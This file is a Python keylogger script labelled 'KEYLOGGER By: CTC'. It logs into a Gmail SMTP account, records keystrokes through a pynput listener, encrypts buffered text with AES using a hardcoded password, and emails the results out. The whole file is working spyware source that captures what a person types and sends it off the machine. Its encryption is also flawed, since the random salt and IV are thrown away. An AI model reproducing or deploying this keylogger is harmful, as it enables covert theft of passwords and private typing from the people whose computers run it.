#! /usr/bin/python3

#Imports
import getpass
import smtplib
import Cryptodome
import pyaes, pbkdf2, binascii, os, secrets
from pynput.keyboard import Key, Listener





# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print(""" By: CTC """)

#Asks user for input, then sets up a mail account to send the input to
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#building the keylogger function
data_to_be_encrypted = ''
data_to_be_sent = ''
full_log = ''
word = ''
email_char_lim = 10

def on_press(key):
    global word
    global full_log
    global email
    global email_char_lim
    global data_to_be_encrypted
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
    if len(full_log) >= email_char_lim:
            data_to_be_encrypted = full_log
            print(full_log)
            full_log = ''
            if len(data_to_be_encrypted) >= email_char_lim:
               encryption()
               data_to_be_encrypted = ''
           
    elif key == Key.shift_l or key == Key.shift_r:
           return
    elif key == Key.backspace:
      word = word[:-1]
    else:
       char = f'{key}'
       char = char[1:-1]
       word += char
   
    if key == Key.esc:
     return False

#Encryption function

def encryption():
    global data_to_be_sent
    global data_to_be_encrypted
    password = "passw0rd"
    passwordSalt = os.urandom(16)
    key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
    iv = secrets.randbits(256)
    plaintext = data_to_be_encrypted
    print(data_to_be_encrypted)
    aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
    ciphertext = aes.encrypt(plaintext)
    data_to_be_sent = ciphertext
    print(ciphertext)
    
    if len(data_to_be_sent) >= email_char_lim:
        send_log()
        data_to_be_encrypted = ''
        plaintext = ''
        full_log = ''
        data_to_be_sent = ''
        print(data_to_be_sent)

#if ciphertext is the same lenght as email_char_limit everything is reseted


#This shit ddefines the send_log function 
def send_log():
    server.sendmail(
          email,
          email,
          data_to_be_sent
     )

with Listener( on_press=on_press ) as listener:
      listener.join()
